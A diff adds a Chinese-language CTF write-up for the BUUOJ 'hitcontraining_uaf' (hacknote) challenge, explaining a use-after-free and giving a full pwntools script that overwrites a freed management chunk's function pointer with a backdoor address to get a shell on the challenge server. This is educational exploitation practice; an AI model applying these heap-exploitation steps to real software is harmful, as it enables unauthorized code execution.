@@ -265,3 +265,64 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### hitcontraining_uaf
+
+[hitcontraining_uaf](https://buuoj.cn/challenges#hitcontraining_uaf)
+
+唉初学者认为这道题比上两道题简单多了。
+
+见字如面（？）uaf 即 use after free，简单来说就是 free 一个 chunk 之后其指针并没有置为 NULL。
+
+这道题随便申请两个块，发现每申请一次就会申请一个大小 为 0x10 的管理 chunk 和符合你要求的 chunk，那个管理 chunk 放着一个神秘地址 0x080485fb 和被它管理的 chunk 的 user_data 起始地址。
+
+那么不难发现当调用 print 的时候其实是去管理 chunk 里找的，我们把它换成后门地址。
+
+具体怎么换呢，我们删掉两个管理 chunk，然后申请一个 0x08（加上 size 是 0x10）的 chunk，那么这个 chunk 的管理 chunk 就是把第二个管理 chunk 拿过来用，这个 chunk 的 user chunk 就是第一个 chunk。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 28011
+io = remote(host,port)
+# io = process("./hacknote")
+elf = ELF("./hacknote")
+magic = 0x8048945
+
+def add_note(content):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'1')
+    io.recvuntil(b"Note size :")
+    io.sendline(str(len(content)).encode())
+    io.recvuntil(b"Content :")
+    io.send(content)
+
+def del_note(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'2')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def print_note(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b'3')
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def main():
+    add_note(b'A'*0x80)  # index 0
+    add_note(b'B'*0x80)  # index 1 for guard
+    del_note(0)
+    del_note(1)
+    add_note(p32(magic) + b'C'*4)   # 管理 chunk
+    print_note(0)
+    io.interactive()
+
+    
+if __name__ == "__main__":
+    main()
+```
